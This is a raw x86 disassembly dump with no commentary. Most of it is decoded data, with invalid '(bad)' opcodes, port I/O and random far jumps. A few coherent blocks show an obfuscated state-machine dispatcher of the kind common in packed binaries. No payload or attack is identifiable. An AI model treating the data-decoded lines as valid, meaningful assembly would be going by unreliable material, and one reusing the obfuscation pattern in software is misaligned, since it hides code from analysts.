  40eafa:	push   ebp
  40eafb:	enter  0xe2dc,0xb2
  40eaff:	cmp    BYTE PTR [ebx-0x3811ad22],dh
  40eb05:	dec    esp
  40eb06:	push   0xffffffb1
  40eb08:	mov    WORD PTR [edi-0x2e1391b2],es
  40eb0e:	xor    dl,ah
  40eb10:	mov    cs,WORD PTR [ebx+0x3c]
  40eb13:	(bad)  
  40eb14:	mov    dh,0x36
  40eb16:	fs mov bl,0x91
  40eb19:	push   edi
  40eb1a:	adc    dl,BYTE PTR [ecx-0xc]
  40eb1d:	stc    
  40eb1e:	call   0x57fa4614
  40eb23:	pushf  
  40eb24:	mov    esp,0x906eb6d9
  40eb29:	mov    ecx,0xe5ffef2b
  40eb2e:	sub    ah,ah
  40eb30:	fld    QWORD PTR [eax]
  40eb32:	mov    esp,DWORD PTR [esi]
  40eb34:	adc    DWORD PTR [ecx],eax
  40eb36:	mov    ch,0x79
  40eb38:	adc    esp,DWORD PTR [esi+0x50fee7d2]
  40eb3e:	into   
  40eb3f:	bound  edi,QWORD PTR [ebp-0x66]
  40eb42:	sbb    eax,0x205a94ed
  40eb47:	xor    al,ah
  40eb49:	es mov esp,0xee2d48be
  40eb4f:	and    al,0x3a
  40eb51:	add    DWORD PTR [edx-0x1b46e31],eax
  40eb57:	aas    
  40eb58:	sbb    eax,0x2ff7284
  40eb5d:	jns    0x40eb74
  40eb5f:	or     al,0x5a
  40eb61:	push   cs
  40eb62:	adc    al,0x54
  40eb64:	shl    BYTE PTR [ebx-0x18],1
  40eb67:	dec    esp
  40eb68:	inc    ebp
  40eb69:	mov    es,WORD PTR [edi+edx*4+0x54]
  40eb6d:	xchg   BYTE PTR [eax-0x17c03cbf],ah
  40eb73:	mov    gs,WORD PTR [ebp+edi*4+0x1b]
  40eb77:	in     eax,0x7d
  40eb79:	adc    DWORD PTR [edx-0x65cf5d9e],eax
  40eb7f:	into   
  40eb80:	xor    al,0xbb
  40eb82:	cmp    esp,DWORD PTR [esi-0x28770467]
  40eb88:	fwait
  40eb89:	and    eax,0xebd2be97
  40eb8e:	xchg   ebp,eax
  40eb8f:	xchg   BYTE PTR [ecx+ebx*8+0x6f],dl
  40eb93:	or     esp,DWORD PTR [edx+0x32]
  40eb96:	adc    DWORD PTR [ebx+0x71],ebp
  40eb99:	icebp  
  40eb9a:	jge    0x40ec18
  40eb9c:	xor    cl,BYTE PTR [ecx]
  40eb9e:	inc    edx
  40eb9f:	inc    edx
  40eba0:	(bad)  
  40eba1:	dec    edi
  40eba2:	mov    eax,0x2bb46ccf
  40eba7:	popf   
  40eba8:	jae    0x40eb68
  40ebaa:	out    dx,eax
  40ebab:	pop    edi
  40ebac:	(bad)  
  40ebad:	arpl   WORD PTR [ecx+0x20],cx
  40ebb0:	push   es
  40ebb1:	mov    bh,0xf6
  40ebb3:	inc    esp
  40ebb4:	out    0xee,eax
  40ebb6:	enter  0x8bad,0x89
  40ebba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebbb:	mov    ebp,0xe63bb53c
  40ebc0:	mov    dh,0xb2
  40ebc2:	retf   0xff03
  40ebc5:	cwde   
  40ebc6:	outs   dx,DWORD PTR ds:[esi]
  40ebc7:	jmp    0x40ebb6
  40ebc9:	mov    ecx,0xfe98b059
  40ebce:	fild   DWORD PTR [edx]
  40ebd0:	inc    edx
  40ebd1:	jne    0x40ec19
  40ebd3:	test   BYTE PTR [ebx+0x3d170abb],dl
  40ebd9:	and    BYTE PTR [ecx],0x88
  40ebdc:	popa   
  40ebdd:	enter  0x8697,0x57
  40ebe1:	sub    al,cl
  40ebe3:	push   cs
  40ebe4:	sub    BYTE PTR [edx],ah
  40ebe6:	xor    dh,BYTE PTR ds:0xa0afc5fb
  40ebec:	iret   
  40ebed:	cmp    DWORD PTR gs:[edi],esi
  40ebf0:	icebp  
  40ebf1:	imul   BYTE PTR [edi+0x75aeb66b]
  40ebf7:	or     al,BYTE PTR [edx+0x77]
  40ebfa:	cld    
  40ebfb:	inc    edx
  40ebfc:	je     0x40ec76
  40ebfe:	int3   
  40ebff:	scas   eax,DWORD PTR es:[edi]
  40ec00:	outs   dx,BYTE PTR ds:[esi]
  40ec01:	ins    BYTE PTR es:[edi],dx
  40ec02:	or     bl,BYTE PTR [ebp+eax*1-0x5204a2d9]
  40ec09:	mov    edi,0x2047c3d3
  40ec0e:	mov    ebp,0xe575e123
  40ec13:	sub    DWORD PTR cs:[edx+0x22],0x69
  40ec18:	fdivr  DWORD PTR [edi]
  40ec1a:	dec    edx
  40ec1b:	xchg   DWORD PTR [esi],edi
  40ec1d:	pop    es
  40ec1e:	push   es
  40ec1f:	out    0xf6,eax
  40ec21:	jecxz  0x40ebfa
  40ec23:	enter  0x86cd,0xdd
  40ec27:	mov    al,ds:0xde3e9e68
  40ec2c:	inc    edi
  40ec2d:	jmp    0x41323ef2
  40ec32:	fwait
  40ec33:	lea    ebp,[ebx+0x5]
  40ec36:	stos   DWORD PTR es:[edi],eax
  40ec37:	leave  
  40ec38:	add    eax,0xe825e1c6
  40ec3d:	addr16 popa 
  40ec3f:	push   0xffffffcf
  40ec41:	enter  0xe35f,0xe2
  40ec45:	out    dx,eax
  40ec46:	ds sbb eax,0x8b740448
  40ec4c:	add    bh,al
  40ec4e:	add    eax,0x4337eb
  40ec53:	xchg   esp,eax
  40ec54:	aas    
  40ec55:	add    BYTE PTR [eax],al
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x4337b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43372f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x433833,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43383f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [edi+eax*2-0x2cb206],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	pop    ds
  40eccd:	mov    esi,0x22d64d1e
  40ecd2:	std    
  40ecd3:	in     al,0x9a
  40ecd5:	and    ah,ch
  40ecd7:	push   ebx
  40ecd8:	outs   dx,DWORD PTR ds:[esi]
  40ecd9:	loopne 0x40ece0
  40ecdb:	xchg   DWORD PTR [esp+esi*8+0x7e5e242a],edi
  40ece2:	cmp    dh,ah
  40ece4:	dec    edx
  40ece5:	aad    0xed
  40ece7:	sbb    BYTE PTR [ebp+0x57],dl
  40ecea:	jo     0x40ed1c
  40ecec:	push   esp
  40eced:	cmp    ah,BYTE PTR ds:0xc97eebdb
  40ecf3:	push   ss
  40ecf4:	stc    
  40ecf5:	add    eax,0x529f019e
  40ecfa:	or     eax,0x7dfa30c8
  40ecff:	inc    esp
  40ed00:	rcl    DWORD PTR [esp+edx*4],cl
  40ed03:	cld    
  40ed04:	fcom   DWORD PTR [eax+0x2c]
  40ed07:	jecxz  0x40eca9
  40ed09:	fldln2 
  40ed0b:	sub    DWORD PTR [ecx+0x1139842b],ebx
  40ed11:	fs xchg esi,eax
  40ed13:	out    dx,eax
  40ed14:	sub    al,0xd4
  40ed16:	in     al,dx
  40ed17:	dec    ebx
  40ed18:	cli    
  40ed19:	inc    ebx
  40ed1a:	scas   eax,DWORD PTR es:[edi]
  40ed1b:	pop    eax
  40ed1c:	jg     0x40ed97
  40ed1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed1f:	sar    BYTE PTR gs:0x4e43e749,0x3b
  40ed27:	sub    eax,0xff9eda8f
  40ed2c:	and    bl,cl
  40ed2e:	xor    ecx,ecx
  40ed30:	mov    bl,0xf2
  40ed32:	icebp  
  40ed33:	outs   dx,DWORD PTR ds:[esi]
  40ed34:	push   ebp
  40ed35:	bound  ebp,QWORD PTR [ebp-0x6]
  40ed38:	repnz pop es
  40ed3a:	xor    cl,ah
  40ed3c:	mov    esp,ecx
  40ed3e:	mov    DWORD PTR [ebx+0x36],ebx
  40ed41:	jl     0x40ed33
  40ed43:	pop    esi
  40ed44:	mov    WORD PTR [edi],fs
  40ed46:	(bad)  
  40ed47:	nop
  40ed48:	add    DWORD PTR [ebx-0x63],ebx
  40ed4b:	cmp    bl,bh
  40ed4d:	icebp  
  40ed4e:	mov    ecx,0x56cdab8e
  40ed53:	repnz inc eax
  40ed55:	push   ecx
  40ed56:	and    ecx,edi
  40ed58:	retf   0xa7b5
  40ed5b:	ins    BYTE PTR es:[edi],dx
  40ed5c:	push   ss
  40ed5d:	dec    edi
  40ed5e:	and    ebx,DWORD PTR [ebx+eiz*8]
  40ed61:	adc    BYTE PTR [ebx],ah
  40ed63:	(bad)
  40ed66:	js     0x40ed65
  40ed68:	mov    bh,0xc6
  40ed6a:	js     0x40edbe
  40ed6c:	test   ecx,edx
  40ed6e:	js     0x40edbc
  40ed70:	mov    al,0x18
  40ed72:	cs push 0x9ec0f69e
  40ed78:	retf   
  40ed79:	mov    bl,0x54
  40ed7b:	jmp    0x9b6596
  40ed80:	xchg   ecx,eax
  40ed81:	aad    0x89
  40ed83:	in     al,dx
  40ed84:	(bad)  
  40ed85:	aas    
  40ed86:	cdq    
  40ed87:	and    BYTE PTR [eax-0xa],0x93
  40ed8b:	out    dx,al
  40ed8c:	(bad)  
  40ed8d:	mov    eax,ecx
  40ed8f:	rcl    DWORD PTR ds:0x7fc2ca41,0x56
  40ed96:	sub    eax,0x4058b7e3
  40ed9b:	xchg   esi,eax
  40ed9c:	jbe    0x40ed60
  40ed9e:	or     al,0x4c
  40eda0:	sub    cl,BYTE PTR [eax+0xc77cff4]
  40eda6:	int3   
  40eda7:	popa   
  40eda8:	popa   
  40eda9:	enter  0x4ff5,0xe0
  40edad:	or     bh,BYTE PTR [edi+0xf83e6cf]
  40edb3:	imul   ebp,DWORD PTR [ecx-0x63],0xc8280d6e
  40edba:	jbe    0x40ee2e
  40edbc:	test   eax,0x91bd89b6
  40edc1:	out    dx,al
  40edc2:	rcr    DWORD PTR [eax],0x72
  40edc5:	xor    BYTE PTR cs:[edi+edx*8-0xb],ch
  40edca:	or     eax,0xc5a735a1
  40edcf:	mov    cl,0x94
  40edd1:	sub    BYTE PTR [esi],0xe7
  40edd4:	mov    eax,0x294ea64b
  40edd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edda:	xor    DWORD PTR [ebp+0xe37c39f],esp
  40ede0:	fwait
  40ede1:	xchg   ecx,eax
  40ede2:	and    dl,BYTE PTR [edx+0x7a6518e3]
  40ede8:	or     dh,ah
  40edea:	mov    ebx,0xd4ed3e6b
  40edef:	adc    bl,bh
  40edf1:	jo     0x40ee1c
  40edf3:	das    
  40edf4:	jae    0x40ee42
  40edf6:	out    dx,eax
  40edf7:	hlt    
  40edf8:	jg     0x40ee56
  40edfa:	jle    0x40edc9
  40edfc:	cdq    
  40edfd:	cwde   
  40edfe:	lahf   
  40edff:	push   esp
  40ee00:	jle    0x40edfb
  40ee02:	jmp    0x6ebfda61
  40ee07:	(bad)  
  40ee08:	pushf  
  40ee09:	aam    0x34
  40ee0b:	(bad)  
  40ee0c:	and    dh,al
  40ee0e:	inc    edx
  40ee0f:	mov    edx,0x3bf4b9bc
  40ee14:	push   cs
  40ee15:	xchg   esi,eax
  40ee16:	push   ecx
  40ee17:	je     0x40edde
  40ee19:	push   esi
  40ee1a:	(bad)  
  40ee1b:	push   eax
  40ee1c:	pusha  
  40ee1d:	dec    esp
  40ee1e:	mov    dh,0x35
  40ee20:	cmp    DWORD PTR [esi+edi*8-0x5c],0xffffff97
  40ee25:	test   al,0xe2
  40ee27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee28:	dec    edx
  40ee29:	mov    bl,BYTE PTR [eax+0x5d]
  40ee2c:	xchg   DWORD PTR [edx],esp
  40ee2e:	sti    
  40ee2f:	stos   BYTE PTR es:[edi],al
  40ee30:	sbb    DWORD PTR [esi],edi
  40ee32:	pop    edx
  40ee33:	les    eax,FWORD PTR [ecx-0x1cfef8e5]
  40ee39:	pop    ds
  40ee3a:	stc    
  40ee3b:	data16 int 0x34
  40ee3e:	add    eax,0xa3f89c6e
  40ee43:	nop
  40ee44:	cli    
  40ee45:	dec    ecx
  40ee46:	sub    al,0x2f
  40ee48:	cmp    eax,esp
  40ee4a:	cmp    eax,0x6d9ff1eb
  40ee4f:	loope  0x40eeb0
  40ee51:	jge    0x40eec4
  40ee53:	or     BYTE PTR [edx-0x754e346e],0x4
  40ee5a:	or     eax,0x5bd558aa
  40ee5f:	adc    ah,BYTE PTR [ebx-0x24f6a88a]
  40ee65:	aad    0xa8
  40ee67:	call   0xc3a8:0x2c30967e
  40ee6e:	add    edx,ebx
  40ee70:	or     ebx,DWORD PTR [edx-0x11]
  40ee73:	repnz inc ebp
  40ee75:	jge    0x40eea8
  40ee77:	inc    ebx
  40ee78:	dec    eax
  40ee79:	test   eax,0x7bc8cd8
  40ee7e:	mov    eax,ds:0x579f5b75
  40ee83:	cmp    dh,BYTE PTR [eax]
  40ee85:	jl     0x40ee91
  40ee87:	mov    DWORD PTR [ebp+0x565c5bb2],ebx
  40ee8d:	inc    ebp
  40ee8e:	cli    
  40ee8f:	mov    dh,0xe6
  40ee91:	or     ebx,DWORD PTR [ecx]
  40ee93:	fstp   TBYTE PTR [ebx+0x68a32a4b]
  40ee99:	inc    ebx
  40ee9a:	das    
  40ee9b:	cdq    
  40ee9c:	jecxz  0x40ee79
  40ee9e:	push   cs
  40ee9f:	push   ebp
  40eea0:	add    dl,BYTE PTR [edx]
  40eea2:	stos   BYTE PTR es:[edi],al
  40eea3:	sub    ebp,DWORD PTR [ebx-0x6]
  40eea6:	and    edx,DWORD PTR [eax+edi*8]
  40eea9:	adc    dl,BYTE PTR [edi-0x16]
  40eeac:	dec    ecx
  40eead:	ins    BYTE PTR es:[edi],dx
  40eeae:	out    dx,al
  40eeaf:	dec    edi
  40eeb0:	adc    ecx,DWORD PTR [ecx-0x5053ee8b]
  40eeb6:	mov    BYTE PTR [eax],dh
  40eeb8:	jmp    DWORD PTR [ebp+0x29]
  40eebb:	enter  0x5dcd,0xe2
  40eebf:	pushf  
  40eec0:	xchg   ebx,eax
  40eec1:	pushf  
  40eec2:	test   BYTE PTR [edx+0x1c0fde5d],ah
  40eec8:	push   ss
  40eec9:	or     al,0xda
  40eecb:	fcmovu st,st(0)
  40eecd:	push   eax
  40eece:	test   DWORD PTR ds:0xcc58cc45,ebx
  40eed4:	push   ebx
  40eed5:	push   ecx
  40eed6:	aam    0x1
  40eed8:	in     eax,0xe1
  40eeda:	fs mov eax,gs
  40eedd:	popf   
  40eede:	pop    ebx
  40eedf:	(bad)  
  40eee0:	(bad)  
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx+0x7698ef46],0x8f29c3f6
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40ef8a
  40ef11:	retf   0x227c
  40ef14:	jmp    0x40ee98
  40ef16:	enter  0xde13,0xc4
  40ef1a:	test   ebx,ebp
  40ef1c:	clc    
  40ef1d:	ss data16 and al,0xe3
  40ef21:	sbb    al,dl
  40ef23:	push   cs
  40ef24:	fs xchg ebx,esp
  40ef27:	adc    DWORD PTR [edx],ebp
  40ef29:	and    dh,BYTE PTR [eax]
  40ef2b:	push   esp
  40ef2c:	fldcw  WORD PTR [edi+0x2b]
  40ef2f:	inc    ebx
  40ef30:	scas   al,BYTE PTR es:[edi]
  40ef31:	out    0x13,eax
  40ef33:	cmp    esi,DWORD PTR [ebp-0x5ac5d533]
  40ef39:	jecxz  0x40eed4
  40ef3b:	loopne 0x40ef1c
  40ef3d:	mov    edi,0x544f8ba4
  40ef42:	hlt    
  40ef43:	pop    edx
  40ef44:	or     edi,esi
  40ef46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef47:	scas   al,BYTE PTR es:[edi]
  40ef48:	mov    DWORD PTR [esi],ecx
  40ef4a:	iret   
  40ef4b:	sub    esp,DWORD PTR [edx+0x16]
  40ef4e:	dec    esi
  40ef4f:	(bad)  
  40ef50:	retf   
  40ef51:	fs (bad) 
  40ef54:	adc    bh,dh
  40ef56:	fs push ebp
  40ef58:	xor    ecx,esp
  40ef5a:	xabort 0x7c
  40ef5d:	jmp    0x40eef0
  40ef5f:	pop    edi
  40ef60:	scas   eax,DWORD PTR es:[edi]
  40ef61:	mov    ds:0x8e17fc94,al
  40ef66:	loopne 0x40efc7
  40ef68:	mov    cl,0x20
  40ef6a:	add    al,0xe2
  40ef6c:	ret    0x8e67
  40ef6f:	pusha  
  40ef70:	scas   al,BYTE PTR es:[edi]
  40ef71:	add    eax,0xa3c49f04
  40ef76:	lds    ebp,FWORD PTR [esi-0xb]
  40ef79:	icebp  
  40ef7a:	retf   0x9781
  40ef7d:	pop    esp
  40ef7e:	adc    sp,WORD PTR [esi-0x21d6b0c2]
  40ef85:	xor    DWORD PTR [ebx-0x1e],edi
  40ef88:	jo     0x40ef42
  40ef8a:	xor    eax,0xd86563ca
  40ef8f:	dec    esp
  40ef90:	pop    esi
  40ef91:	arpl   WORD PTR [ecx],cx
  40ef93:	imul   edx,DWORD PTR [edi-0x1931f318],0x11b0468f
  40ef9d:	push   ebp
  40ef9e:	loope  0x40effe
  40efa0:	cmp    BYTE PTR [esi+0x10a10977],ch
  40efa6:	leave  
  40efa7:	sbb    esi,ecx
  40efa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efaa:	pop    ebx
  40efab:	push   ss
  40efac:	mov    BYTE PTR ds:0xd49998fa,0xb6
  40efb3:	ret    0x3651
  40efb6:	inc    esi
  40efb7:	rol    BYTE PTR [ebx-0x4f],1
  40efba:	or     esp,DWORD PTR [esp+edi*8+0x1b]
  40efbe:	cmp    edx,DWORD PTR [ebp-0x77660553]
  40efc4:	dec    esi
  40efc5:	out    0x29,eax
  40efc7:	aas    
  40efc8:	sahf   
  40efc9:	into   
  40efca:	stos   BYTE PTR es:[edi],al
  40efcb:	sub    eax,0x5a09ad7f
  40efd0:	shl    DWORD PTR [edi*1-0x350d592e],cl
  40efd7:	jne    0x40f041
  40efd9:	pop    ecx
  40efda:	cwde   
  40efdb:	push   ebp
  40efdc:	sbb    al,0xf5
  40efde:	icebp  
  40efdf:	ss xor eax,0xee1aad78
  40efe5:	or     ebp,DWORD PTR [eax]
  40efe7:	add    DWORD PTR [ebx+0x72],0xe69fb39d
  40efee:	xchg   ebx,eax
  40efef:	xor    ecx,DWORD PTR [ebx+ebp*8+0x2ff430c0]
  40eff6:	into   
  40eff7:	pop    ss
  40eff8:	or     ecx,ebx
  40effa:	je     0x40efb0
  40effc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40effd:	ins    DWORD PTR es:[edi],dx
  40effe:	adc    al,0x3e
  40f000:	call   0x117a:0x316f0e3
  40f007:	mov    ebp,0xc8d2e1a4
  40f00c:	xor    al,0xf5
  40f00e:	dec    esp
  40f00f:	cli    
  40f010:	rcl    BYTE PTR [eax-0x2e],1
  40f013:	test   DWORD PTR [ebp+0xa],0x204628b9
  40f01a:	pop    ebx
  40f01b:	xchg   DWORD PTR [esi+0x5383c670],esp
  40f021:	and    DWORD PTR ds:0x1903b5b5,0x6f
  40f028:	add    BYTE PTR [edi-0x6e4515ec],ch
  40f02e:	xchg   ecx,eax
  40f02f:	into   
  40f030:	(bad)  
  40f031:	mov    eax,0x6d0f2890
  40f036:	adc    BYTE PTR [esi+0x373d6aa7],ah
  40f03c:	xchg   DWORD PTR [ebx],eax
  40f03e:	add    eax,0x56180d8a
  40f043:	sahf   
  40f044:	inc    edi
  40f045:	retf   
  40f046:	jp     0x40f064
  40f048:	retf   0x6186
  40f04b:	int3   
  40f04c:	inc    eax
  40f04d:	mov    DWORD PTR [esi],esp
  40f04f:	iret   
  40f050:	adc    al,0x1e
  40f052:	and    DWORD PTR [ebp-0x44],0x9c2c4f8
  40f059:	je     0x40f03c
  40f05b:	out    0x59,eax
  40f05d:	(bad)  
  40f05e:	aad    0xaf
  40f060:	pusha  
  40f061:	cmp    al,ah
  40f063:	test   ecx,ebp
  40f065:	or     al,ah
  40f067:	dec    edx
  40f068:	stos   DWORD PTR es:[edi],eax
  40f069:	stos   BYTE PTR es:[edi],al
  40f06a:	xor    DWORD PTR [ebx-0x52],ecx
  40f06d:	xor    al,0xd3
  40f06f:	dec    esp
  40f070:	test   eax,0x32d5a3bc
  40f075:	mov    edx,0x6c726475
  40f07a:	jg     0x40f0d3
  40f07c:	fdiv   st,st(6)
  40f07e:	gs push es
  40f080:	or     al,0x18
  40f082:	scas   eax,DWORD PTR es:[edi]
  40f083:	and    eax,0x735b2d1a
  40f088:	add    eax,0xbf438b94
  40f08d:	jno    0x40f099
  40f08f:	lods   eax,DWORD PTR ds:[esi]
  40f090:	and    esi,esi
  40f092:	push   esi
  40f093:	fst    DWORD PTR [ecx]
  40f095:	xchg   edi,eax
  40f096:	fst    st(1)
  40f098:	pop    ss
  40f099:	pop    esp
  40f09a:	dec    edi
  40f09b:	mov    ah,BYTE PTR [eiz*4+0x1a0e834f]
  40f0a2:	ret    0x17e1
  40f0a5:	(bad)  
  40f0a7:	ja     0x40f077
  40f0a9:	ret    0xc5e1
  40f0ac:	fist   WORD PTR [esi-0x12ac78b5]
  40f0b2:	adc    al,0xab
  40f0b4:	xor    eax,0x1c3ecee1
  40f0b9:	push   edi
  40f0ba:	mov    bh,0xcd
  40f0bc:	sahf   
  40f0bd:	mov    bh,0x3f
  40f0bf:	pusha  
  40f0c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0c1:	mov    al,0xd4
  40f0c3:	sbb    ecx,eax
  40f0c5:	dec    si
  40f0c7:	loope  0x40f12d
  40f0c9:	iret   
  40f0ca:	add    DWORD PTR [edi-0x4d],0xc76b2071
  40f0d1:	mov    bl,0xa1
  40f0d3:	mov    eax,ds:0xfd1efad2
  40f0d8:	fdivrp st(1),st
  40f0da:	into   
  40f0db:	js     0x40f0da
  40f0dd:	inc    eax
  40f0de:	cld    
  40f0df:	scas   eax,DWORD PTR es:[edi]
  40f0e0:	pop    ecx
  40f0e1:	cmp    DWORD PTR [ebx],edi
  40f0e3:	or     ch,BYTE PTR [esi+eiz*4-0x1cd480c3]
  40f0ea:	ins    DWORD PTR es:[edi],dx
  40f0eb:	test   al,dl
  40f0ed:	iret   
  40f0ee:	add    al,0x1c
  40f0f0:	pop    es
  40f0f1:	xchg   ebx,eax
  40f0f2:	popf   
  40f0f3:	sbb    DWORD PTR [ebx-0x4d],edi
  40f0f6:	mov    ch,0xfc
  40f0f8:	cdq    
  40f0f9:	jle    0x40f167
  40f0fb:	lods   al,BYTE PTR ds:[esi]
  40f0fc:	cmc    
  40f0fd:	or     DWORD PTR [ecx+0x5e],edi
  40f100:	or     esp,ebp
  40f102:	add    al,0x1
  40f104:	mov    dh,bh
  40f106:	jecxz  0x40f0ee
  40f108:	push   es
  40f109:	aam    0x8d
  40f10b:	mov    bl,0xea
  40f10d:	retf   0x40b0
  40f110:	and    BYTE PTR [esi-0x5e76d8a8],dh
  40f116:	mov    edx,0x7a9445d6
  40f11b:	out    0x51,eax
  40f11d:	xor    edi,DWORD PTR [ecx-0x63]
  40f120:	cmp    edi,0x1a3
  40f126:	jne    0x40f17b
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx+0x726dacfe]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f261
  40f1e9:	dec    ebp
  40f1ea:	stos   BYTE PTR es:[edi],al
  40f1eb:	pushf  
  40f1ec:	into   
  40f1ed:	sub    eax,0x48057456
  40f1f2:	cwde   
  40f1f3:	lock sbb al,0xcd
  40f1f6:	push   es
  40f1f7:	xor    al,0x27
  40f1f9:	jo     0x40f274
  40f1fb:	jl     0x40f23b
  40f1fd:	sbb    BYTE PTR [ebp+0x6349587f],0x34
  40f204:	cmp    esi,DWORD PTR [ebx-0x3450f7b6]
  40f20a:	mov    DWORD PTR [edx+0x2],esi
  40f20d:	push   cs
  40f20e:	ins    DWORD PTR es:[edi],dx
  40f20f:	arpl   WORD PTR [edi+0x99d664a],si
  40f215:	or     eax,esi
  40f217:	inc    edi
  40f218:	inc    esp
  40f219:	ffree  st(5)
  40f21b:	test   eax,0x35cfa359
  40f220:	or     edx,esi
  40f222:	ja     0x40f1c2
  40f224:	stc    
  40f225:	jo     0x40f264
  40f227:	pusha  
  40f228:	mov    bh,0x79
  40f22a:	aas    
  40f22b:	mov    ah,BYTE PTR [edx+0x35]
  40f22e:	test   eax,0x94160b91
  40f233:	repnz sbb BYTE PTR [ebp-0xc38df66],ch
  40f23a:	jge    0x40f1f2
  40f23c:	sbb    dh,BYTE PTR [ecx-0x503e2913]
  40f242:	jae    0x40f22c
  40f244:	lds    ebx,FWORD PTR [ebx+0x6c]
  40f247:	(bad)  
  40f249:	push   esp
  40f24a:	fidiv  WORD PTR [edx+0x72]
  40f24d:	and    ebx,0xffffffa4
  40f250:	popa   
  40f251:	aam    0xb9
  40f253:	xor    DWORD PTR [esi+0x6e],ebx
  40f256:	mov    edx,?
  40f258:	jecxz  0x40f22e
  40f25a:	retf   0xc9e7
  40f25d:	add    DWORD PTR [edi-0x27],0xb8ad9267
  40f264:	scas   eax,DWORD PTR es:[edi]
  40f265:	fs in  eax,0x3
  40f268:	dec    esi
  40f269:	mov    esi,cs
  40f26b:	dec    edi
  40f26c:	xchg   BYTE PTR [ebx],dh
  40f26e:	pop    edx
  40f26f:	in     al,dx
  40f270:	adc    al,0xd8
  40f272:	inc    ebp
  40f273:	ficom  WORD PTR [edi]
  40f275:	shl    DWORD PTR [esi],0xef
  40f278:	sub    eax,0x46a737a0
  40f27d:	fcom   QWORD PTR [edx-0x561faebd]
  40f283:	(bad)  
  40f284:	call   0x34cd:0xe758e7d7
  40f28b:	es fwait
  40f28d:	adc    BYTE PTR [ebp+0x1b],bl
  40f290:	dec    ebp
  40f291:	pusha  
  40f292:	imul   ebx,DWORD PTR [ecx-0x62],0xffffff90
  40f296:	je     0x40f27f
  40f298:	aaa    
  40f299:	lods   al,BYTE PTR ds:[esi]
